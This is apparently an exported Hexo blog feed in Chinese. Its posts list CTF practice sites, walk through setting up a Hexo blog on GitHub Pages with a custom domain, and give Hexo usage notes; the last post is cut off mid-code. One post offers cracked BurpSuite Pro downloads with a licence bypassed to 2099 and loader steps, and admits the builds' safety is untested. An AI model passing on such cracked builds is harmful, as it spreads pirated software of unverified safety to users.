        <content type="html"><![CDATA[<p>一些CTF学习的网站</p><a id="more"></a><h1 id="CTF-资讯"><a href="#CTF-资讯" class="headerlink" title=" CTF 资讯 "></a><font size="5"> CTF 资讯 </font></h1><p><a href="https://www.xctf.org.cn/" target="_blank" rel="noopener"><em>XCTF联赛</em></a></p><p><a href="http://bobao.350.cn/" target="_blank" rel="noopener"><em>350安全客</em></a></p><p><a href="https://ctftime.org/event/list/upcoming" target="_blank" rel="noopener"><em>CTFTIME</em></a></p><h1 id="CTF练习"><a href="#CTF练习" class="headerlink" title=" CTF练习 "></a><font size="5"> CTF练习 </font></h1><h1 id="BIN"><a href="#BIN" class="headerlink" title="BIN:"></a>BIN:</h1><p><a href="http://reversing.kr" target="_blank" rel="noopener"><em>Reverse逆向学习</em></a></p><p><a href="http://pwnable.kr/" target="_blank" rel="noopener"><em>Pwnable</em></a></p><p><a href="http://pwnable.tw" target="_blank" rel="noopener"><em>Pwnable (台湾)</em></a></p><p><a href="http://security.cs.rpi.edu/courses/binexp-spring2015" target="_blank" rel="noopener"><em>Modern Binary Exploitation</em></a></p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener"><em>XSS 挑战</em></a></p><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener"><em>Sqli-lbas</em></a></p><h1 id="综合练习"><a href="#综合练习" class="headerlink" title=" 综合练习 "></a><font size="5"> 综合练习 </font></h1><p><a href="http://hackinglab.cn/" target="_blank" rel="noopener"><em>网络信息攻防学习平台</em></a></p><p><a href="http://www.baimaoxueyuan.com/" target="_blank" rel="noopener"><em>白茅学院</em></a></p><p><a href="http://captf.com/" target="_blank" rel="noopener"><em>CTF题目</em></a></p><p><a href="http://www.shiyanbar.com/ctf/index" target="_blank" rel="noopener"><em>西普实验吧</em></a></p><p><a href="http://www.hetianlab.com/CTFrace.html" target="_blank" rel="noopener"><em>合天CTF</em></a></p><p><a href="http://www.ichunqiu.com/tiaozhans" target="_blank" rel="noopener"><em>I春秋CTF挑战</em></a></p><p><a href="http://ctf.idf.cn/" target="_blank" rel="noopener"><em>IDF 实验室</em></a></p><h1 id="OJ平台以及CTF赛事复盘"><a href="#OJ平台以及CTF赛事复盘" class="headerlink" title=" OJ平台以及CTF赛事复盘 "></a><font size="5"> OJ平台以及CTF赛事复盘 </font></h1><p><a href="http://oj.xctf.org.cn/" target="_blank" rel="noopener"><em>XCTF-OJ</em></a></p><p><a href="http://pwnhub.cn" target="_blank" rel="noopener"><em>Pwnhub</em></a></p><p><a href="https://www.jarvisoj.com/" target="_blank" rel="noopener"><em>Jarvisoj -汪师傅OJ平台</em></a></p><p><a href="http://ctf.nuptsast.com" target="_blank" rel="noopener"><em>南京邮电大学复盘</em></a></p><h1 id="各种姿势的学习平台"><a href="#各种姿势的学习平台" class="headerlink" title=" 各种姿势的学习平台 "></a><font size="5"> 各种姿势的学习平台 </font></h1><p><a href="http://www.52pojie.cn/" target="_blank" rel="noopener"><em>吾爱破解</em></a></p><p><a href="http://bbs.pediy.com/" target="_blank" rel="noopener"><em>看雪论坛</em></a></p><p><a href="https://www.t00ls.net/" target="_blank" rel="noopener"><em>T00ls</em></a></p><h1 id="CTF-Writeup-解题报告"><a href="#CTF-Writeup-解题报告" class="headerlink" title=" CTF-Writeup 解题报告 "></a><font size="5"> CTF-Writeup 解题报告 </font></h1><p><a href="http://bobao.350.cn/ctf/" target="_blank" rel="noopener"><em>350安全客</em></a></p><p><a href="https://github.com/ctfs/" target="_blank" rel="noopener"><em>CTF Writeup -github</em></a></p><p><a href="https://github.com/VulnHub/ctf-writeups" target="_blank" rel="noopener"><em>Writeups</em></a></p><p>Good good study,day day up !</p><p><a href="http://archimesan.me/">回到主页</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见的ctf学习网站 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite 永久使用版（附下载）</title>
      <link href="/2017/12/13/BurpSuite%E4%B8%8B%E8%BD%BD/"/>
      <url>/2017/12/13/BurpSuite%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<p>BurpSuite 破解版多个版本下载</p><a id="more"></a><h1 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h1><p>1、BurpSuite 永久使用版，并非最新的 BurpSuite 破解版。</p><p>2、此版本同样是 LarryLau 破解的，但是授权日期是到 2099-12-3</p><p>3、本文将汇总一些关于 BurpSuite 的教程等，请认真查看。 </p><h1 id="BurpSuite-介绍"><a href="#BurpSuite-介绍" class="headerlink" title="BurpSuite 介绍"></a>BurpSuite 介绍</h1><p>借用一下 52pojie 的文章中的描述信息：<a href="https://www.52pojie.cn/thread-648337-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-648337-1-1.html</a></p><p>Burp Suite 是用于攻击web应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。</p><p>所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代{过}{滤}理，日志，警报的一个强大的可扩展的框架。</p><p><img src="1.png" alt></p><p><img src="2.png" alt></p><p><img src="3.png" alt></p><p><img src="4.png" alt></p><p><img src="5.png" alt></p><p><img src="6.png" alt></p><p><img src="7.png" alt></p><p><img src="8.png" alt></p><p><img src="9.png" alt></p><p><img src="10.png" alt></p><p>#burpSuite破解版下载</p><p>BurpSuiteV1.5.20 破解版，授权日期到 2099-12-3</p><p><a href="burpsuite_pro_v1.5.20.rar">burpsuite_pro_v1.5.20</a></p><p>BurpSuiteV1.6 破解版，授权日期到 2099-12-3</p><p><a href="Burpsuite+Pro+1.6.rar">Burpsuite+Pro+1.6</a></p><p>BurpSuite 无限制版，安全性自测。</p><p><a href="Burp-Suite-Professional-1.7.26.rar">BurpUnlimited</a></p><p>感谢作者：Larry_Lau</p><p>若使用 BurpSuite 的时候，依然提示授权过期或者是 BurpSuite 停止响应的情况，请做如下操作：</p><p><img src="11.png" alt></p><p>执行 Clean burp from computer，这样会清理 burp 的授权及临时文件等，还你一个干净的 burp 使用环境，然后重新执行 burploader.jar。</p><p>执行如下操作，将对你的眼睛很有好处，同样还会解决中文乱码的问题，请看图：</p><p><img src="12.png" alt></p><h1 id="BurpSuite-教程"><a href="#BurpSuite-教程" class="headerlink" title="BurpSuite 教程"></a>BurpSuite 教程</h1><p><a href="https://t0data.gitbooks.io/burpsuite/content/" target="_blank" rel="noopener">BurpSuite 实战指南</a></p><p><a href="https://www.waitalone.cn/burpsuite-series-uses-video-tutorials.html" target="_blank" rel="noopener">BurpSuite 系列使用视频教程</a></p><p><a href="https://www.waitalone.cn/burpsuite-sqlmap.html" target="_blank" rel="noopener">在BurpSuite 中集成 Sqlmap</a></p><p><a href="https://www.waitalone.cn/burpsuite-plugins.html" target="_blank" rel="noopener">BurpSuite 中的安全测试插件推荐</a></p><p><a href="https://www.waitalone.cn/burpsuite-js.html" target="_blank" rel="noopener">利用 BurpSuite 突破 JS 限制登陆后台</a></p><p>BurpSuite 实战指南请认真看完，强烈推荐。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Burpsuite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建hexo</title>
      <link href="/2017/12/12/%E6%90%AD%E5%BB%BAhexo/"/>
      <url>/2017/12/12/%E6%90%AD%E5%BB%BAhexo/</url>
      
        <content type="html"><![CDATA[<font size="4">使用 Hexo+Github 一步步搭建属于自己的博客 </font> <a id="more"></a><font size="2.5"><br>前言：电脑系统为 window 10 专业版，64位<br></font><h1 id="相关步骤："><a href="#相关步骤：" class="headerlink" title="相关步骤："></a>相关步骤：</h1><h2 id="安装-Node-js-和配置好-Node-js-环境"><a href="#安装-Node-js-和配置好-Node-js-环境" class="headerlink" title="安装 Node.js 和配置好 Node.js 环境"></a>安装 Node.js 和配置好 Node.js 环境</h2><p>打开 cmd 命令行，成功界面如下。</p><p><img src="1.png" alt></p><h2 id="安装-Git-和配置好-Git-环境"><a href="#安装-Git-和配置好-Git-环境" class="headerlink" title="安装 Git 和配置好 Git 环境"></a>安装 Git 和配置好 Git 环境</h2><p>安装成功的象征就是在电脑上任何位置鼠标右键能够出现如下两个选择。</p><p><img src="2.png" alt></p><p>注意：一般出于安全考虑，只有在 Git Bash Here 中才能进行 Git 的相关操作.如果需要在 cmd 命令行里调用 Git，那么就要配置电脑的环境变量 Path，或者在安装的时候选择 use Git from the Windows Command Prompt。这个可有可无，影响不大，成功配置的界面如图：</p><p><img src="2_1.png" alt></p><h2 id="Github账户注册和新建项目"><a href="#Github账户注册和新建项目" class="headerlink" title="Github账户注册和新建项目"></a>Github账户注册和新建项目</h2><p>注意：项目必须要遵守格式：账户名.github.io，不然接下来会有很多麻烦.并且需要勾选 Initialize this repository with a README</p><p><img src="3.png" alt></p><p>在建好的项目右侧有个 settings 按钮，点击它，向下拉到 GitHub Pages<br>你会看到那边有个网址，访问它，你将会惊奇的发现该项目已经被部署到网络上，能够通过外网来访问它。</p><p><img src="3_1.png" alt></p><h2 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h2><h3 id="建立一个-blog-文件夹，然后通过命令行进入到该文件夹里面"><a href="#建立一个-blog-文件夹，然后通过命令行进入到该文件夹里面" class="headerlink" title="建立一个 blog 文件夹，然后通过命令行进入到该文件夹里面"></a>建立一个 blog 文件夹，然后通过命令行进入到该文件夹里面</h3><p>输入 npm install hexo -g，开始安装 Hexo。</p><p><img src="4.png" alt></p><h3 id="输入-hexo-v，检查-hexo-是否安装成功"><a href="#输入-hexo-v，检查-hexo-是否安装成功" class="headerlink" title="输入 hexo -v，检查 hexo 是否安装成功"></a>输入 hexo -v，检查 hexo 是否安装成功</h3><p><img src="4_1.png" alt></p><h3 id="输入-hexo-init，初始化该文件夹-有点漫长的等待…"><a href="#输入-hexo-init，初始化该文件夹-有点漫长的等待…" class="headerlink" title="输入 hexo init，初始化该文件夹(有点漫长的等待…)"></a>输入 hexo init，初始化该文件夹(有点漫长的等待…)</h3><p><img src="4_2.png" alt></p><h3 id="输入-npm-install，安装所需要的组件"><a href="#输入-npm-install，安装所需要的组件" class="headerlink" title="输入 npm install，安装所需要的组件"></a>输入 npm install，安装所需要的组件</h3><p><img src="4_3.png" alt></p><h3 id="输入-hexo-g，首次体验-Hexo。"><a href="#输入-hexo-g，首次体验-Hexo。" class="headerlink" title="输入 hexo g，首次体验 Hexo。"></a>输入 hexo g，首次体验 Hexo。</h3><p><img src="4_4.png" alt></p><h3 id="输入-hexo-s，开启服务器，访问该网址，正式体验He-xo"><a href="#输入-hexo-s，开启服务器，访问该网址，正式体验He-xo" class="headerlink" title="输入 hexo s，开启服务器，访问该网址，正式体验He xo"></a>输入 hexo s，开启服务器，访问该网址，正式体验He xo</h3><p><img src="4_5.png" alt></p><p>注意：假如页面一直无法跳转，那么可能端口被占用了。<br>此时我们 ctrl+c 停止服务器，接着输入”hexo server -p 端口号”来改变端口号</p><p><img src="4_6.png" alt></p><h3 id="出现如下图就成功了"><a href="#出现如下图就成功了" class="headerlink" title="出现如下图就成功了"></a>出现如下图就成功了</h3><p><img src="4_7.png" alt></p><h2 id="将-Hexo与Github-page-联系起来"><a href="#将-Hexo与Github-page-联系起来" class="headerlink" title="将 Hexo与Github page 联系起来"></a>将 Hexo与Github page 联系起来</h2><h3 id="设置Git的-username-和-email-如果是第一次的话"><a href="#设置Git的-username-和-email-如果是第一次的话" class="headerlink" title="设置Git的 username 和 email (如果是第一次的话)"></a>设置Git的 username 和 email (如果是第一次的话)</h3><p><img src="5.png" alt></p><p>注意：这里要替换成自己的用户名，邮箱要替换成自己的邮箱</p><h3 id="输入-cd-ssh，检查是否由-ssh-的文件夹"><a href="#输入-cd-ssh，检查是否由-ssh-的文件夹" class="headerlink" title="输入 cd ~/.ssh，检查是否由 .ssh 的文件夹"></a>输入 cd ~/.ssh，检查是否由 .ssh 的文件夹</h3><p><img src="5_1.png" alt></p><p>输入 ls，列出该文件下的内容.下图说明 .ssh 文件夹存在</p><p><img src="5_2.png" alt></p><h3 id="配置自己的信息"><a href="#配置自己的信息" class="headerlink" title="配置自己的信息"></a>配置自己的信息</h3><p>输入 ssh-keygen -t rsa -C “你自己的邮箱”，连续三个回车，生成密钥.<br>最后得到了两个文件：id_rsa 和 id_rsa.pub (默认存储路径是：.ssh 文件夹下)</p><p><img src="5_3.png" alt></p><h3 id="输入-eval”-ssh-agent-s-”，添加密钥到-ssh-agent"><a href="#输入-eval”-ssh-agent-s-”，添加密钥到-ssh-agent" class="headerlink" title="输入 eval”$(ssh-agent -s)”，添加密钥到 ssh-agent"></a>输入 eval”$(ssh-agent -s)”，添加密钥到 ssh-agent</h3><p><img src="5_4.png" alt></p><h3 id="再输入-ssh-add-ssh-id-rsa，添加生成的-SSH-key到-ssh-agent"><a href="#再输入-ssh-add-ssh-id-rsa，添加生成的-SSH-key到-ssh-agent" class="headerlink" title="再输入 ssh-add ~/.ssh/id_rsa，添加生成的 SSH key到 ssh-agent"></a>再输入 ssh-add ~/.ssh/id_rsa，添加生成的 SSH key到 ssh-agent</h3><p><img src="5_5.png" alt></p><h3 id="登录-Github，点击头像下的-settings，添加-ssh"><a href="#登录-Github，点击头像下的-settings，添加-ssh" class="headerlink" title="登录 Github，点击头像下的 settings，添加 ssh"></a>登录 Github，点击头像下的 settings，添加 ssh</h3><p><img src="5_6.png" alt></p><h3 id="新建一个-new-ssh-key，将-id-rsa-pub-文件里的内容复制上去"><a href="#新建一个-new-ssh-key，将-id-rsa-pub-文件里的内容复制上去" class="headerlink" title="新建一个 new ssh key，将 id_rsa.pub 文件里的内容复制上去"></a>新建一个 new ssh key，将 id_rsa.pub 文件里的内容复制上去</h3><p><img src="5_7.png" alt></p><h3 id="输入-ssh-T-git-github-com，测试添加-ssh-是否成功"><a href="#输入-ssh-T-git-github-com，测试添加-ssh-是否成功" class="headerlink" title="输入 ssh -T git@github.com，测试添加 ssh 是否成功"></a>输入 ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>，测试添加 ssh 是否成功</h3><p>如果看到 Hi 后面是你的用户名，就说明成功了。</p><p><img src="5_8.png" alt></p><h2 id="配置-Deployment"><a href="#配置-Deployment" class="headerlink" title="配置 Deployment"></a>配置 Deployment</h2><p>在其文件夹中，找到_config.yml 文件，修改 repo 值(在末尾)</p><p><img src="6.png" alt></p><p>repository 值是你在 github 项目里的 ssh (右下角)</p><p><img src="6_1.png" alt></p><h2 id="新建一篇博客"><a href="#新建一篇博客" class="headerlink" title="新建一篇博客"></a>新建一篇博客</h2><h3 id="在cmd执行命令：hexo-new-post-“博客名”"><a href="#在cmd执行命令：hexo-new-post-“博客名”" class="headerlink" title="在cmd执行命令：hexo new post “博客名”"></a>在cmd执行命令：hexo new post “博客名”</h3><p><img src="7.png" alt></p><p>这时候在文件夹_posts目录下将会看到已经创建的文件</p><p><img src="7_1.png" alt></p><h3 id="使用编辑器编好文章"><a href="#使用编辑器编好文章" class="headerlink" title="使用编辑器编好文章"></a>使用编辑器编好文章</h3><p>使用命令：hexo d -g，生成以及部署了</p><p><img src="7_2.png" alt></p><h3 id="部署成功后访问你的地址"><a href="#部署成功后访问你的地址" class="headerlink" title="部署成功后访问你的地址"></a>部署成功后访问你的地址</h3><p>http://用户名.github.io. </p><p>那么将看到生成的文章</p><p><img src="7_3.png" alt></p><p>成功。</p><h2 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h2><p>只推荐上 GoDaddy 购买，安全，而且可以使用支付宝。</p><p>现在 GoDaddy 已经有中文版了，虽然国家显示是新加坡，但不影响使用。</p><p><img src="8.jpg" alt></p><h3 id="查你想要的域名"><a href="#查你想要的域名" class="headerlink" title="查你想要的域名"></a>查你想要的域名</h3><p><img src="8_1.jpg" alt></p><h3 id="查到适合的域名之后选择「添加到购物车」"><a href="#查到适合的域名之后选择「添加到购物车」" class="headerlink" title="查到适合的域名之后选择「添加到购物车」"></a>查到适合的域名之后选择「添加到购物车」</h3><p><img src="8_2.jpg" alt></p><h3 id="GoDaddy-其他域名收费服务，不要管，继续「进入购物车」"><a href="#GoDaddy-其他域名收费服务，不要管，继续「进入购物车」" class="headerlink" title="GoDaddy 其他域名收费服务，不要管，继续「进入购物车」"></a>GoDaddy 其他域名收费服务，不要管，继续「进入购物车」</h3><p><img src="8_3.jpg" alt></p><p>后面的服务全部点击「不，谢谢」，免费的服务也不要用</p><h3 id="确认购买"><a href="#确认购买" class="headerlink" title="确认购买"></a>确认购买</h3><p>修改购买年限，默认是两年，可以修改成 1/2/3/5/10 年，随自己喜欢<br>现在 GoDaddy 上 .com 每年的默认费用是7元/年<br>但实际上，你看到我现在购买的是第1年：​¥5.86/年<br>第 2 年后：¥101.00/年，GoDaddy 的域名价格时常有波动，以当时为准即可。</p><p><img src="8_4.jpg" alt></p><h2 id="将独立域名与-GitHub-Pages-的空间绑定"><a href="#将独立域名与-GitHub-Pages-的空间绑定" class="headerlink" title="将独立域名与 GitHub Pages 的空间绑定"></a>将独立域名与 GitHub Pages 的空间绑定</h2><h3 id="DNS设置"><a href="#DNS设置" class="headerlink" title="DNS设置"></a>DNS设置</h3><p>用DNSpod，快，免费，稳定。</p><h3 id="注册-DNSpod，添加域名，如下图设置"><a href="#注册-DNSpod，添加域名，如下图设置" class="headerlink" title="注册 DNSpod，添加域名，如下图设置"></a>注册 DNSpod，添加域名，如下图设置</h3><p><img src="9.jpg" alt></p><p>其中 A 的两条记录指向的ip地址是 GitHub Pages 的提供的 ip</p><ul><li>192.30.252.153</li></ul><ul><li>192.30.252.154</li></ul><p>如博客不能登录，有可能是 GitHub 更改了空间服务的 ip 地址，记得及时到在 GitHub Pages 查看最新的 ip 即可</p><p>www 指定的记录是你在 GitHub 注册的仓库。</p><p>去 GoDaddy 修改 DNS 地址</p><h3 id="更改-GoDaddy-的-Nameservers-为-DNSpod-的-NameServers"><a href="#更改-GoDaddy-的-Nameservers-为-DNSpod-的-NameServers" class="headerlink" title="更改 GoDaddy 的 Nameservers 为 DNSpod 的 NameServers"></a>更改 GoDaddy 的 Nameservers 为 DNSpod 的 NameServers</h3><h3 id="点击你的账户，管理我的域名"><a href="#点击你的账户，管理我的域名" class="headerlink" title="点击你的账户，管理我的域名"></a>点击你的账户，管理我的域名</h3><p><img src="9_1.jpg" alt></p><h3 id="点击域名"><a href="#点击域名" class="headerlink" title="点击域名"></a>点击域名</h3><p><img src="9_2.jpg" alt></p><h3 id="将-GoDaddy-的-Nameservers-更改成-f1g1ns1-dnspod-net-和-f1g1ns2-dnspod-net"><a href="#将-GoDaddy-的-Nameservers-更改成-f1g1ns1-dnspod-net-和-f1g1ns2-dnspod-net" class="headerlink" title="将 GoDaddy 的 Nameservers 更改成 f1g1ns1.dnspod.net 和 f1g1ns2.dnspod.net"></a>将 GoDaddy 的 Nameservers 更改成 f1g1ns1.dnspod.net 和 f1g1ns2.dnspod.net</h3><p><img src="9_3.jpg" alt></p><p>到此为止，最基本的也是最全面的 hexo+github 搭建博客完结。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo的使用介绍</title>
      <link href="/2017/12/12/hexo%E4%BD%BF%E7%94%A8/"/>
      <url>/2017/12/12/hexo%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>自用笔记：本文属于自用笔记，不做详解，仅供参考。在此记录自己已理解并开始遵循的前端代码规范。What How Why 最近，使用Hexo遇到了很多问题，在设立进行整理。</p><a id="more"></a><h2 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ hexo n <span class="comment">#写文章</span></span><br><span class="line">  其中my new post为文章标题，执行命令后。</span><br><span class="line">  会在项目\source_posts中生成my new post.md文件，用编辑器打开编写即可。</span><br><span class="line">  当然，也可以直接在\source_posts中新建一个md文件，我就是这么做的。</span><br><span class="line">  文章开头语法：</span><br><span class="line">title: name <span class="comment">#文章标题</span></span><br><span class="line">date: 2015-12-25 18:29:00  <span class="comment">#写作时间</span></span><br><span class="line">description: <span class="comment">#文章描述</span></span><br><span class="line">categories: <span class="comment">#文章分类</span></span><br><span class="line">- 建站</span><br><span class="line">tags: <span class="comment">#文章标签</span></span><br><span class="line">- 博客</span><br><span class="line">- 建站</span><br><span class="line">- Hexo</span><br><span class="line">toc: <span class="literal">true</span> <span class="comment"># 生成目录</span></span><br><span class="line">author:</span><br><span class="line">comments:</span><br><span class="line">original:</span><br><span class="line">permalink: <span class="comment">#指定链接</span></span><br><span class="line">---</span><br><span class="line">  以上是摘要</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">  以下是余下全文</span><br></pre></td></tr></table></figure><h2 id="写多钟文章"><a href="#写多钟文章" class="headerlink" title="写多钟文章"></a>写多钟文章</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new [layout] <span class="string">"postName"</span> <span class="comment">#新建文章</span></span><br><span class="line">  [layout]：其中layout是可选参数，默认值为post。</span><br><span class="line">  有哪些layout呢，请到 scaffolds 目录下查看，这些文件名称就是layout名称。</span><br><span class="line">  当然你可以添加自己的layout，方法就是添加一个文件即可。</span><br><span class="line">  同时你也可以编辑现有的layout，比如post的layout默认是 hexo\scaffolds\post.md</span><br><span class="line">  关于hexo\scaffolds\photo.md配置文件的介绍：</span><br><span class="line">layout: &#123; &#123; layout &#125; &#125; <span class="comment">#layout名称</span></span><br><span class="line">title: &#123; &#123; title &#125; &#125; <span class="comment">#文章标题</span></span><br><span class="line">date: &#123; &#123; date &#125; &#125; <span class="comment">#文章生成时间</span></span><br><span class="line">ategories: <span class="comment">#文章分类目录</span></span><br><span class="line">tags:  <span class="comment">#文章标签</span></span><br><span class="line">-  <span class="comment">#</span></span><br><span class="line">photos:  <span class="comment">#</span></span><br><span class="line">-  <span class="comment">#</span></span><br><span class="line">---</span><br><span class="line">layout: photo</span><br><span class="line">title: 我的阅历</span><br><span class="line">date: 2085-01-16 07:33:44</span><br><span class="line">tags: [hexo]</span><br><span class="line">photos:</span><br><span class="line">- http://bruce.u.qiniudn.com/2013/11/27/reading/photos-0.jpg</span><br><span class="line">- http://bruce.u.qiniudn.com/2013/11/27/reading/photos-1.jpg</span><br></pre></td></tr></table></figure><h2 id="自定义页面"><a href="#自定义页面" class="headerlink" title="自定义页面"></a>自定义页面</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  执行new page命令</span><br><span class="line">$ hexo new page <span class="string">"about"</span></span><br><span class="line">在 *hexo\<span class="built_in">source</span>\* 下会生成 *about* 目录，里面有个index.md，直接编辑就可以了，</span><br><span class="line">然后在主题的 *_config.yml* 中将其配置显示出来。 </span><br><span class="line">上述步骤，也可以手工生成，在 *hexo\<span class="built_in">source</span>\* 下手工新建</span><br><span class="line">  *about* 和 *index.md* 也是完全等价的。</span><br><span class="line">因为markdown对table的支持不好，我是在about中直接</span><br><span class="line">建立index.html，里面书写页面内容，hexo会帮你加上头和尾。</span><br></pre></td></tr></table></figure><h2 id="写页面（404）"><a href="#写页面（404）" class="headerlink" title="写页面（404）"></a>写页面（404）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page <span class="string">"404"</span></span><br><span class="line">UUhike@UUhike-pc MINGW64 /d/Hexo/Hexo (master)</span><br><span class="line">$ hexo new page <span class="string">"404"</span></span><br><span class="line">INFO  Created: D:\Hexo\Hexo\<span class="built_in">source</span>\404\index-1.md</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">title: 404 Not Found：该页无法显示</span><br><span class="line">comments: <span class="literal">false</span></span><br><span class="line">permalink: /404</span><br><span class="line">fancybox: <span class="literal">false</span></span><br><span class="line">---</span><br><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</span><br><span class="line">    .article-title &#123;</span><br><span class="line">        font-size: 2.1em;</span><br><span class="line">    &#125;</span><br><span class="line">    strong a &#123;</span><br><span class="line">        color: <span class="comment">#747474;</span></span><br><span class="line">    &#125;</span><br><span class="line">    .share &#123;</span><br><span class="line">        display: none;</span><br><span class="line">    &#125;</span><br><span class="line">    .player &#123;</span><br><span class="line">        margin-left: -10px;</span><br><span class="line">    &#125;</span><br><span class="line">    .sign &#123;</span><br><span class="line">        text-align: right;</span><br><span class="line">        font-style: italic;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#page-visit &#123;</span></span><br><span class="line">        display: none;</span><br><span class="line">    &#125;</span><br><span class="line">    .center &#123;</span><br><span class="line">        text-align: center;</span><br><span class="line">        height: 2.5em;</span><br><span class="line">        font-weight: bold;</span><br><span class="line">    &#125;</span><br><span class="line">    .search2 &#123;</span><br><span class="line">        height: 2.2em;</span><br><span class="line">        font-size: 1em;</span><br><span class="line">        width: 50%;</span><br><span class="line">        margin: auto 24%;</span><br><span class="line">        color: <span class="comment">#727272;</span></span><br><span class="line">        opacity: .6;</span><br><span class="line">        border: 2px solid lightgray;</span><br><span class="line">    &#125;</span><br><span class="line">    .search2:hover &#123;</span><br><span class="line">        opacity: 1;</span><br><span class="line">        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3)</span><br><span class="line">        &#125;;</span><br><span class="line">    .article-entry hr &#123;</span><br><span class="line">        margin: 0;</span><br><span class="line">    &#125;</span><br><span class="line">    .pic &#123;</span><br><span class="line">        text-align: center;</span><br><span class="line">        margin: 0;</span><br><span class="line">    &#125;</span><br><span class="line">    .pic br &#123;</span><br><span class="line">        display: none;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">***</span><br><span class="line">&lt;div class=<span class="string">"pic"</span>&gt;</span><br><span class="line">&lt;img src=<span class="string">"/resources/Mihawk-Wind.gif"</span> title=<span class="string">"Mihawk-Wind"</span>&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;p class=<span class="string">"center"</span>&gt;很抱歉，您所访问的地址并不存在: &lt;/p&gt;</span><br><span class="line">&lt;p class=<span class="string">"center"</span>&gt;&lt;a href=<span class="string">"/"</span>&gt;回主页&lt;/a&gt; · &lt;a href=<span class="string">"/archives"</span>&gt;所有文章&lt;/a&gt; · &lt;a href=<span class="string">"/about"</span>&gt;留言板&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class=<span 